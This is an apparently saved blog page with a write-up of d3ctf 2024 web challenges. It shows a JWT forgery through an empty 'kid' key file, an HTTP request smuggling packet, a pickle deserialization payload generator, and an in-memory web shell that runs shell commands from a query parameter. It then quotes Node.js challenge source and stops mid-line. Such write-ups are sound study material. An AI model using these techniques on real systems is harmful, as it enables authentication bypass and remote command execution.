@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="google-site-verification" content="kDP0Dxs1_nBan7wIjoDmFGV34uwZ0l0hwkRGuuJUe2g" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zoiltin.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="d^3ctf 2024 web方向wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="d3ctf-2024-web-wp">
+<meta property="og:url" content="https://zoiltin.github.io/2024/04/28/d3ctf-2024-web-wp/index.html">
+<meta property="og:site_name" content="Zoiltin&#39;s Blog">
+<meta property="og:description" content="d^3ctf 2024 web方向wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zoiltin.github.io/images/pwn.png">
+<meta property="og:image" content="https://zoiltin.github.io/images/memshell.png">
+<meta property="og:image" content="https://zoiltin.github.io/images/stack.png">
+<meta property="og:image" content="https://zoiltin.github.io/images/record.png">
+<meta property="article:published_time" content="2024-04-28T12:35:50.000Z">
+<meta property="article:modified_time" content="2024-04-29T14:30:59.186Z">
+<meta property="article:author" content="Zoiltin">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="d3ctf 2024">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zoiltin.github.io/images/pwn.png">
+
+<link rel="canonical" href="https://zoiltin.github.io/2024/04/28/d3ctf-2024-web-wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>d3ctf-2024-web-wp | Zoiltin's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Zoiltin's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友链">
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-friends"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zoiltin.github.io/2024/04/28/d3ctf-2024-web-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Zoiltin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zoiltin's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          d3ctf-2024-web-wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-28 20:35:50" itemprop="dateCreated datePublished" datetime="2024-04-28T20:35:50+08:00">2024-04-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-29 22:30:59" itemprop="dateModified" datetime="2024-04-29T22:30:59+08:00">2024-04-29</time>
+              </span>
+
+          
+            <div class="post-description">d^3ctf 2024 web方向wp</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="d3pythonhttp"><a href="#d3pythonhttp" class="headerlink" title="d3pythonhttp"></a>d3pythonhttp</h1><blockquote>
+<p>解决，一血</p>
+</blockquote>
+<h3 id="jwt绕过"><a href="#jwt绕过" class="headerlink" title="jwt绕过"></a>jwt绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">kid</span>):</span><br><span class="line">    key = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&quot;/app/&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">dir</span>+kid, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_token</span>(<span class="params">token</span>):</span><br><span class="line">    header = jwt.get_unverified_header(token)</span><br><span class="line">    kid = header[<span class="string">&quot;kid&quot;</span>]</span><br><span class="line">    key = get_key(kid)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = jwt.decode(token, key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+<p>验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(jwt.encode(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;isadmin&quot;</span>:true&#125;, key, algorithm=<span class="string">&quot;HS256&quot;</span>, headers=&#123;<span class="string">&quot;kid&quot;</span>: <span class="string">&quot;frontend_keyasdasd&quot;</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment"># eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="解析差异"><a href="#解析差异" class="headerlink" title="解析差异"></a>解析差异</h3><p>一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。<br>经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;key: value <span class="keyword">for</span> (key, value) <span class="keyword">in</span> request.headers <span class="keyword">if</span> key != <span class="string">&#x27;Host&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。<br>数据包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: 192.168.72.137:8081</span><br><span class="line">Content-Length: 192</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M</span><br><span class="line">Transfer-Encoding: chunKed</span><br><span class="line"></span><br><span class="line">dc</span><br><span class="line">&lt;base64payload...长度为192&gt;BackdoorPasswordOnlyForAdmin</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>后端只读取前192个字符，后面的BackdoorPasswordOnlyForAdmin被舍弃。绕过。<br>base64解码后pickle反序列化。           </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">print(1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(payload,))</span><br><span class="line">    </span><br><span class="line">a = test()</span><br><span class="line">b = base64.b64encode(pickle.dumps(a))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>
+<h3 id="突破内网"><a href="#突破内网" class="headerlink" title="突破内网"></a>突破内网</h3><p>题目不出网，可以试试整个类似内存马的东西（从dubhe ctf 2024中学到的）。<br>后端存在以下路由：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">urls = (</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;index&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/backdoor&#x27;</span>, <span class="string">&#x27;backdoor&#x27;</span></span><br><span class="line">)</span><br><span class="line">web.config.debug = <span class="literal">False</span></span><br><span class="line">app = web.application(urls, <span class="built_in">globals</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">index</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;welcome to the backend!&quot;</span></span><br></pre></td></tr></table></figure>
+<p>对应前端代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backend&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_to_backend</span>():</span><br><span class="line">    forward_url = <span class="string">&quot;python-backend:8080&quot;</span></span><br><span class="line">    conn = http.client.HTTPConnection(forward_url)</span><br><span class="line">    method = request.method</span><br><span class="line">    headers = &#123;key: value <span class="keyword">for</span> (key, value) <span class="keyword">in</span> request.headers <span class="keyword">if</span> key != <span class="string">&quot;Host&quot;</span>&#125;</span><br><span class="line">    data = request.data</span><br><span class="line">    path = <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.query_string:</span><br><span class="line">        path += <span class="string">&quot;?&quot;</span> + request.query_string.decode()</span><br><span class="line">    conn.request(method, path, body=data, headers=headers)</span><br><span class="line">    response = conn.getresponse()</span><br><span class="line">    <span class="keyword">return</span> response.read()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用exec函数执行以下python代码就可以将index路由的GET方法覆盖(asd参数要保留，因为服务器调用的时候会传一个self参数)：</span><br><span class="line">```python</span><br><span class="line">def test(asd):</span><br><span class="line">    return &quot;pwned&quot;</span><br><span class="line">index.GET = test</span><br></pre></td></tr></table></figure>
+<p><img src="/../images/pwn.png"><br>访问index路由是可以带get参数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.query_string:</span><br><span class="line">    path += <span class="string">&quot;?&quot;</span> + request.query_string.decode()</span><br></pre></td></tr></table></figure>
+<p>所以内存马实现如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">asd</span>):</span><br><span class="line">    cmd = web.<span class="built_in">input</span>().cmd</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(cmd).read()</span><br><span class="line">index.GET = test</span><br></pre></td></tr></table></figure>
+<p><img src="/../images/memshell.png"></p>
+<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack_overflow"></a>stack_overflow</h1><blockquote>
+<p>解决，一血</p>
+</blockquote>
+<p>题目用nodejs模拟了一个栈溢出。<br>关键代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> respond = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> stack = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> getStack = <span class="keyword">function</span> (<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (address - pie &gt;= <span class="number">0</span> &amp;&amp; address - pie &lt; <span class="number">0x10000</span>) <span class="keyword">return</span> stack[address - pie]</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> getIndex = <span class="keyword">function</span> (<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> address - pie</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> read = <span class="keyword">function</span> (<span class="params">fd, buf, count</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> ori = req.<span class="property">body</span>[fd]</span><br><span class="line">    <span class="keyword">if</span> (ori.<span class="property">length</span> &lt; count) &#123;</span><br><span class="line">        count = ori.<span class="property">length</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> ori !== <span class="string">&quot;string&quot;</span> &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(ori)) <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="string">&quot;err&quot;</span>: <span class="string">&quot;hack!&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">waf</span>(ori[i])) <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="string">&quot;err&quot;</span>: <span class="string">&quot;hack!&quot;</span>&#125;)</span><br><span class="line">        stack[<span class="title function_">getIndex</span>(buf) + i] = ori[i]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> write = <span class="keyword">function</span> (<span class="params">fd, buf, count</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!respond.<span class="title function_">hasOwnProperty</span>(fd)) &#123;</span><br><span class="line">        respond[fd] = []</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">        respond[fd].<span class="title function_">push</span>(<span class="title function_">getStack</span>(buf + i))   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> run = <span class="keyword">function</span> (<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> continuing = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (continuing) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="title function_">getStack</span>(address)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;read&quot;</span>:</span><br><span class="line">                <span class="keyword">let</span> r_fd = stack.<span class="title function_">pop</span>()</span><br><span class="line">                <span class="keyword">let</span> read_addr = stack.<span class="title function_">pop</span>()</span><br><span class="line">                <span class="keyword">if</span> (read_addr.<span class="title function_">startsWith</span>(<span class="string">&quot;&#123;&#123;&quot;</span>) &amp;&amp; read_addr.<span class="title function_">endsWith</span>(<span class="string">&quot;&#125;&#125;&quot;</span>)) &#123;</span><br><span class="line">                    read_addr = pie + <span class="built_in">eval</span>(read_addr.<span class="title function_">slice</span>(<span class="number">2</span>,-<span class="number">2</span>).<span class="title function_">replace</span>(<span class="string">&quot;stack&quot;</span>, (stack.<span class="property">length</span> - <span class="number">1</span>).<span class="title function_">toString</span>()))</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_">read</span>(r_fd, <span class="built_in">parseInt</span>(read_addr), <span class="built_in">parseInt</span>(stack.<span class="title function_">pop</span>()))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;write&quot;</span>:</span><br><span class="line">                <span class="keyword">let</span> w_fd = stack.<span class="title function_">pop</span>()</span><br><span class="line">                <span class="keyword">let</span> write_addr = stack.<span class="title function_">pop</span>()</span><br><span class="line">                <span class="keyword">if</span> (write_addr.<span class="title function_">startsWith</span>(<span class="string">&quot;&#123;&#123;&quot;</span>) &amp;&amp; write_addr.<span class="title function_">endsWith</span>(<span class="string">&quot;&#125;&#125;&quot;</span>)) &#123;</span><br><span class="line">                    write_addr = pie + <span class="built_in">eval</span>(write_addr.<span class="title function_">slice</span>(<span class="number">2</span>,-<span class="number">2</span>).<span class="title function_">replace</span>(<span class="string">&quot;stack&quot;</span>, (stack.<span class="property">length</span> - <span class="number">1</span>).<span class="title function_">toString</span>()))</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_">write</span>(w_fd, <span class="built_in">parseInt</span>(write_addr), <span class="built_in">parseInt</span>(stack.<span class="title function_">pop</span>()))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                continuing = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;call_interface&quot;</span>:</span><br><span class="line">                <span class="keyword">let</span> numOfArgs = stack.<span class="title function_">pop</span>()</span><br><span class="line">                <span class="keyword">let</span> cmd = stack.<span class="title function_">pop</span>()</span><br><span class="line">                <span class="keyword">let</span> args = []</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numOfArgs; i++) &#123;</span><br><span class="line">                    args.<span class="title function_">push</span>(stack.<span class="title function_">pop</span>())</span><br><span class="line">                &#125;</span><br><span class="line">                cmd += <span class="string">&quot;(&#x27;&quot;</span>  + args.<span class="title function_">join</span>(<span class="string">&quot;&#x27;,&#x27;&quot;</span>) + <span class="string">&quot;&#x27;)&quot;</span></span><br><span class="line">                <span class="keyword">let</span> result = vm.<span class="title function_">runInNewContext</span>(cmd)</span><br><span class="line">                stack.<span class="title function_">push</span>(result.<span class="title function_">toString</span>())</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;push&quot;</span>:</span><br><span class="line">                <span class="keyword">let</span> numOfElem = stack.<span class="title function_">pop</span>()</span><br><span class="line">                <span class="keyword">let</span> elemAddr = <span class="built_in">parseInt</span>(stack.<span class="title function_">pop</span>())</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numOfElem; i++) &#123;</span><br><span class="line">                    stack.<span class="title function_">push</span>(<span class="title function_">getStack</span>(elemAddr + i))</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="attr">default</span>:</span><br><span class="line">                stack.<span class="title function_">push</span>(<span class="title function_">getStack</span>(address))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        address += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">let</span> code = <span class="string">`0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span 